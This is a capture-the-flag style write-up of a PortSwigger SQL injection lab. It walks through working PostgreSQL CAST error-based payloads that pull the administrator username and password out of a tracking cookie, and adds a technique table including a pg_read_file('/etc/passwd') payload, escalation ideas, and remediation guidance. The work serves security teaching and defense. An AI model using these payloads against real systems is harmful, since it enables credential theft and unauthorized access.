# Lab 13: Visible Error-Based SQL Injection

## Executive Summary

This lab demonstrates exploitation of a visible error-based SQL injection vulnerability where the application reflects database error messages directly in HTTP responses. Unlike blind injection scenarios that require inference through side channels, this attack leverages PostgreSQL's strict type casting system to force the database into returning sensitive data inside error messages themselves. By injecting a `CAST()` conversion that deliberately mismatches data types, I extracted the administrator username and plaintext password directly from error output without any UNION-based enumeration or boolean inference. The attack required minimal requests and achieved full credential extraction and administrative access through a concise, precise exploitation chain.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection - Error-Based Extraction |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Visible Error-Based SQL Injection via Type Casting |
| **Risk**               | Critical - Direct Credential Extraction via Database Errors |
| **Completion**         | May 8, 2026 |

## Objective

Exploit a visible error-based SQL injection vulnerability in the tracking cookie parameter by leveraging PostgreSQL's type casting mechanism to force database error messages that reflect sensitive data — specifically the administrator account password — directly in the HTTP response, achieving full administrative access with minimal payload iterations.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Proxy for traffic interception and HTTP history analysis
- Burp Repeater for iterative payload testing

**Target:** TrackingId cookie parameter with unsanitized input reflected into a backend SQL query, running on a PostgreSQL database

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed the lab environment confirming the challenge title "SQL injection with visible error messages" and verified Burp Suite Professional was correctly configured to intercept traffic from the target application.

<img width="1920" height="982" alt="LAB1_ss1" src="https://github.com/user-attachments/assets/34c33cec-8845-4d2b-abf1-ad8f2fe2fd0f" />

*Lab 13 environment displaying the visible error-based SQL injection challenge (right) | Burp Suite Professional licensed to Gurpreet Singh, configured and active (left)*

### 2. Traffic Interception and Attack Surface Identification

Began browsing the application with Burp Proxy active to populate HTTP history. Reviewed all captured requests across the site and identified the TrackingId cookie as a high-value injection candidate — it is transmitted with every page load and is highly likely to feed into a backend SQL query for analytics or session tracking purposes.

<img width="1920" height="982" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/ebf89732-ef38-4ba8-9657-67d68210d9aa" />

*Burp Proxy HTTP history showing all captured requests (left) | High-interest request selected and highlighted for forwarding to Repeater*

**Request Captured:**
```http
GET / HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: TrackingId=[TRACKING_VALUE]; session=[SESSION_VALUE]
```

**Injection Point Rationale:**
- TrackingId values are typically used in backend queries of the form:
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]'
```
- No client-side validation or encoding observed on the cookie value
- Value is not reflected in the response body under normal conditions, making error response behavior the key diagnostic signal

### 3. SQL Injection Confirmation — Syntax Break

Forwarded the captured request to Burp Repeater and appended a single quote to the existing TrackingId value to deliberately break SQL syntax and observe whether the application surfaces database errors.

**Test Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]''
```

<img width="1920" height="982" alt="LAB1_ss3" src="https://github.com/user-attachments/assets/9cddb556-c616-4d60-b3cc-1f8a3834eec0" />

*Single quote appended to TrackingId — 500 Internal Server Error response confirms broken SQL syntax and confirms injection point is live*

**Response:** 500 Internal Server Error

**Analysis:** The single quote terminates the string literal prematurely, producing invalid SQL syntax. The application does not catch or sanitize the exception — the database error propagates to the HTTP response. This is the first confirmation that the parameter is injectable and that error output is visible.

### 4. Syntax Restoration and Injection Channel Verification

**Step 4.1 — Comment-Based Syntax Correction**

To confirm the injection channel can be controlled cleanly, appended `'--` to terminate the query string and comment out any trailing SQL that would cause a syntax error.

**Test Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]'--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]'--'
```


<img width="1920" height="982" alt="LAB1_ss4 1" src="https://github.com/user-attachments/assets/6ec0a0f3-6cc7-43ae-804f-e6a07c33092e" />

*Comment injection `'--` restores valid syntax — 200 OK response confirms attacker-controlled SQL termination is functioning correctly*

**Response:** 200 OK

**Analysis:** The `--` sequence comments out the remainder of the original query, eliminating the syntax error introduced by the injected quote. A clean 200 OK at this stage confirms the injection channel is fully controllable and that query structure can be manipulated at will.

**Step 4.2 — CAST Injection Baseline: Integer Conversion Test**

With the injection channel confirmed, began testing the error-based data extraction technique using PostgreSQL's `CAST()` function. The objective is to force a type mismatch error that causes the database to reveal data in the error message itself.

Prior reconnaissance via `ORDER BY 1--` and `ORDER BY 2--` had already established that the query returns a single column. Testing with `UNION SELECT NULL--` and `UNION SELECT NULL,NULL--` confirmed one-column output. Attempts to concatenate non-integer output types also validated that the result set expects a non-text type — all of which pointed toward type casting as the optimal extraction mechanism.

Submitted the initial CAST test payload:

**Test Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]' AND CAST((SELECT 1) AS int)--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]' AND CAST((SELECT 1) AS int)--
```

<img width="1920" height="982" alt="LAB1_ss4 2" src="https://github.com/user-attachments/assets/77773b93-136e-43c7-8912-16a97d554669" />

*CAST integer test — error response reads: "ERROR: argument of AND must be type boolean, not type integer, position: 64" — confirms PostgreSQL database and identifies required correction: result must evaluate as boolean*

**Response:** Application error — `argument of AND must be type boolean, not type integer`

**Analysis:** PostgreSQL requires the right-hand operand of `AND` to resolve to a boolean. A bare `CAST((SELECT 1) AS int)` returns an integer, which PostgreSQL rejects at the logical operator level. This error is directly useful — it reveals the database engine (PostgreSQL), the position in the query where the issue occurs, and exactly what correction is needed: the cast result must be wrapped in a boolean comparison.

**Step 4.3 — Boolean Wrapper Applied**

Corrected the payload structure by introducing a boolean equality comparison that satisfies PostgreSQL's type requirement for the `AND` clause.

**Test Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]' AND 1=CAST((SELECT 1) AS int)--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]' AND 1=CAST((SELECT 1) AS int)--
```

<img width="1920" height="982" alt="LAB1_ss4 3" src="https://github.com/user-attachments/assets/a01afa1d-3d95-45f2-907a-5d02daecbafb" />

*Boolean-wrapped CAST — 200 OK confirms the corrected payload is syntactically valid and executes cleanly. The CAST mechanism is operational and ready for data extraction*

**Response:** 200 OK

**Analysis:** Wrapping the cast result in `1=CAST(...)` satisfies PostgreSQL's boolean requirement. The subquery executes without error, and the comparison evaluates cleanly. The extraction mechanism is now confirmed to be functional. Replacing the static integer `1` inside the subquery with an actual column reference will cause a type mismatch error that reveals the column's value in the error message.

### 5. Credential Extraction

**Step 5.1 — Username Extraction Attempt (Multiple Row Error)**

Replaced the static integer with a live subquery targeting the `username` column in the `users` table to force PostgreSQL to attempt casting a string username as an integer — which it cannot do — causing it to reveal the string value inside the error message.

**Attack Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]' AND 1=CAST((SELECT username FROM users) AS int)--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]' AND 1=CAST((SELECT username FROM users) AS int)--
```

<img width="1920" height="982" alt="LAB1_ss5 1" src="https://github.com/user-attachments/assets/057deaea-1921-4b95-8014-ca611bded5a1" />


*Username extraction without row limit — error response indicates the subquery returned multiple rows, consistent with earlier column enumeration findings. The database rejects multi-row subquery results in this context*

**Response:** Error — subquery returned more than one row

**Analysis:** PostgreSQL does not allow a scalar subquery context (used here inside `CAST`) to return multiple rows. The `users` table contains more than one record. A `LIMIT 1` clause is required to constrain the subquery to a single row before the type cast is evaluated.

**Step 5.2 — Username Extraction with Row Limit Applied**

Added `LIMIT 1` to constrain the subquery result to the first row, allowing the CAST to proceed and produce a type mismatch error containing the actual username value.

**Attack Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```


<img width="1920" height="982" alt="lab1_ss5 2" src="https://github.com/user-attachments/assets/e598ef88-bf1b-45de-b3c7-6757997b55fa" />

*LIMIT 1 applied — error response reads: "invalid input syntax for type integer: 'administrator'" — the first row of the username column is directly exposed in the error message*

**Response:** `ERROR: invalid input syntax for type integer: "administrator"`

**Analysis:** With the subquery constrained to one row, PostgreSQL attempts to cast the string `administrator` as an integer type. Since a username string cannot be represented as an integer, PostgreSQL raises a type conversion error that includes the original string value verbatim in the message. The administrator account is confirmed as the first user in the table.

**Step 5.3 — Password Extraction**

With the administrator username confirmed, substituted `password` for `username` in the subquery to extract the corresponding plaintext password using the identical CAST error mechanism.

**Attack Payload:**
```http
Cookie: TrackingId=[TRACKING_VALUE]' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**SQL Query Produced:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

<img width="1920" height="982" alt="LAB1_ss5 3" src="https://github.com/user-attachments/assets/00a23e9d-f11a-41b4-a825-553a1559aa77" />


*Password extraction — error response reads: "invalid input syntax for type integer: '[extracted_password]'" — the administrator plaintext password is directly exposed in the error message via the same type casting mechanism*

**Response:** `ERROR: invalid input syntax for type integer: "[extracted_password]"`

**Credentials Extracted:**
- **Username:** `administrator`
- **Password:** `[extracted_password]`

### 6. Administrator Account Compromise

Navigated to the login page and authenticated using the extracted administrator credentials.


<img width="1920" height="982" alt="LAB1_ss6" src="https://github.com/user-attachments/assets/a3b01a47-fd29-44ef-b360-70fff5058e0d" />

*Login page with administrator credentials submitted (right) | Full administrative access confirmed — account dashboard visible with lab completion message (left)*

**Complete System Compromise:**
- Injection point identified and confirmed in TrackingId cookie
- PostgreSQL database type fingerprinted through error output
- CAST-based type mismatch extraction mechanism established
- Administrator username retrieved directly from error message
- Administrator password retrieved directly from error message
- Full administrative authentication achieved

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.8)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Primary Vulnerabilities:**

**CWE-89: SQL Injection**
- TrackingId cookie value is concatenated directly into a SQL query without parameterization
- No input sanitization or type enforcement applied at the application layer
- Full query control achieved through single-quote injection

**CWE-209: Generation of Error Message Containing Sensitive Information**
- Database error messages are not suppressed or genericized before reaching the HTTP response
- PostgreSQL type conversion errors include the literal value that failed conversion
- Sensitive data (usernames, passwords) is exposed directly in visible error output

**CWE-116: Improper Output Encoding**
- Application propagates raw database exception text to the client
- No error handling layer abstracts internal state from external responses

**Complete Attack Chain:**

```
TrackingId Cookie Identified as Injection Point
        ↓
Single Quote Breaks SQL Syntax → 500 Error Confirms Injection
        ↓
Comment Injection '-- Restores Syntax → 200 OK Confirms Control
        ↓
Column Count Confirmed (1 column) via ORDER BY and UNION Testing
        ↓
CAST Integer Test → PostgreSQL Type Error Reveals Database Engine
        ↓
Boolean Wrapper Applied → CAST Mechanism Validated (200 OK)
        ↓
Username Subquery Without LIMIT → Multiple Row Error
        ↓
Username Subquery With LIMIT 1 → 'administrator' in Error Message
        ↓
Password Subquery With LIMIT 1 → Plaintext Password in Error Message
        ↓
Administrator Authentication → Complete System Compromise
```

**Why PostgreSQL CAST Extraction Works:**

PostgreSQL enforces strict type rules at query execution time. When a subquery returning a string value is wrapped in `CAST(... AS int)`, the engine attempts the conversion and raises an exception if it fails. Critically, PostgreSQL includes the offending value verbatim in the error message:

```
ERROR: invalid input syntax for type integer: "administrator"
```

This behavior transforms every type mismatch into an unintentional data disclosure channel. The attacker does not need to observe any difference in application behavior beyond the error text itself — the data is delivered directly.

**CAST Extraction Payload Anatomy:**

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

| Component | Purpose |
|-----------|---------|
| `'` | Terminates the original string literal |
| `AND` | Extends the WHERE clause with attacker-controlled condition |
| `1=` | Satisfies PostgreSQL boolean type requirement for AND operand |
| `CAST(... AS int)` | Forces type conversion — fails on string data, producing error |
| `SELECT password FROM users` | Targets credential column |
| `LIMIT 1` | Constrains subquery to single row — required for scalar context |
| `--` | Comments out remainder of original query |

**Comparison: Error-Based vs. Blind SQL Injection Approaches:**

| Attribute | Visible Error-Based (This Lab) | Blind Conditional Error | Blind Boolean |
|-----------|-------------------------------|------------------------|---------------|
| **Output Channel** | Error message in response | HTTP status code | HTTP status code |
| **Data per Request** | Full string value | 1 bit (error / no error) | 1 bit (true / false) |
| **Requests for 20-char password** | 2 | 1,240+ | 1,240+ |
| **Automation Required** | No | Yes (Intruder Cluster Bomb) | Yes |
| **Skill Complexity** | Moderate | High | High |
| **Stealth Profile** | Moderate (errors logged) | Low (normal-looking requests) | Low |

**Real-World Impact:**

| Target Environment | Consequence |
|--------------------|-------------|
| **E-Commerce Platform** | Full customer database extraction, payment credential theft |
| **SaaS Application** | Multi-tenant credential dump, complete account takeover |
| **Healthcare System** | PHI exposure, medical record access, HIPAA violation |
| **Financial Services** | Account credential extraction, transaction data access |
| **Internal Enterprise App** | Lateral movement via reused credentials, privilege escalation |

**Escalation Potential:**

Direct credential extraction via visible errors is a high-efficiency attack vector. Beyond administrator account compromise, an attacker could:

- Dump all user records from the `users` table by iterating `OFFSET` values
- Enumerate other tables through `information_schema` queries via the same CAST mechanism
- Use extracted credentials for credential stuffing against other services if passwords are reused
- Achieve remote code execution if the database account has write access to the filesystem (e.g., PostgreSQL `COPY TO/FROM` with superuser privileges)

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Cookie parameter identification as injection surface
- Syntax-break and syntax-restore confirmation technique
- Database fingerprinting via error message content
- CAST-based type mismatch extraction on PostgreSQL
- Row constraint technique to handle multi-row subquery rejection
- Sequential column targeting (username then password) for credential assembly

**Critical Security Insights:**

**1. Visible Errors Collapse the Complexity of Blind Injection:**
Applications that expose raw database error messages to clients eliminate the primary defense blind injection relies on — the absence of data in responses. A single CAST payload here accomplished what a 1,240-request Cluster Bomb attack achieves against a blind target. Error suppression is not optional — it is a load-bearing security control.

**2. PostgreSQL Type Enforcement is a Double-Edged Property:**
PostgreSQL's strict typing is architecturally sound — but when error messages are surfaced to users, that strictness becomes an extraction primitive. The same behavior that makes the database reliable under normal conditions makes it an unwitting accomplice in data disclosure during injection. Other databases handle type errors differently; MySQL often performs implicit conversion silently rather than raising an exception, making this technique PostgreSQL-specific.

**3. Parameterized Queries Are the Only Adequate Fix:**

**Vulnerable Pattern:**
```python
query = "SELECT tracking_data FROM tracking WHERE id = '" + tracking_id + "'"
cursor.execute(query)
```

**Secure Pattern:**
```python
query = "SELECT tracking_data FROM tracking WHERE id = %s"
cursor.execute(query, (tracking_id,))
```

Parameterized queries separate SQL structure from user-supplied data at the driver level. No amount of input validation or WAF rule covers every injection variant — parameterization removes the attack surface entirely.

**4. Error Handling Must Be Implemented at the Application Layer:**

Even with parameterized queries deployed, error suppression is a required defense-in-depth measure. Database exceptions should never propagate to HTTP responses. A properly implemented error handler:

- Catches all database exceptions before they reach the response layer
- Logs the full exception server-side for debugging
- Returns only a generic error message to the client with no internal detail

**5. TrackingId Cookies Are Frequently Overlooked Attack Surfaces:**
Analytics and session tracking cookies are commonly deprioritized during security review because they appear to be passive, non-functional parameters. In practice, they often feed directly into SQL queries and are subject to the same injection risks as any other user-controlled input. All cookie parameters should be included in injection testing scope.

**PostgreSQL-Specific Techniques Reference:**

| Technique | Payload Structure | Output |
|-----------|-------------------|--------|
| **CAST Type Error (used)** | `CAST((SELECT col FROM tbl LIMIT 1) AS int)` | Column value in error message |
| **XML Error Extraction** | `CAST((SELECT col FROM tbl LIMIT 1) AS xml)` | Column value in XML parse error |
| **Division by Zero (Blind)** | `CASE WHEN (cond) THEN 1/0 ELSE 1 END` | Error or no error (boolean inference) |
| **Large Object Error** | `pg_read_file('/etc/passwd')` (superuser only) | File contents if privileges allow |

**Defense-in-Depth Requirements:**

| Control | Purpose | Adequacy Alone |
|---------|---------|----------------|
| Parameterized queries | Eliminates injection | Sufficient for injection prevention |
| Error suppression | Removes data disclosure channel | Insufficient alone — injection still possible |
| Input validation | Reduces attack surface | Insufficient alone — bypassed by encoding |
| WAF rules | Blocks known signatures | Insufficient alone — bypassed by obfuscation |
| Least privilege DB account | Limits blast radius | Insufficient alone — data still accessible |

No single control is sufficient. Parameterized queries paired with generic error handling and least privilege database accounts represents the minimum adequate baseline.

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - Improper Neutralization of Special Elements used in an SQL Command
4. CWE-209 - Generation of Error Message Containing Sensitive Information
5. PostgreSQL Documentation - Error Codes and Type Casting
6. OWASP SQL Injection Prevention Cheat Sheet

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems, credential extraction, or database enumeration is illegal under applicable laws worldwide.
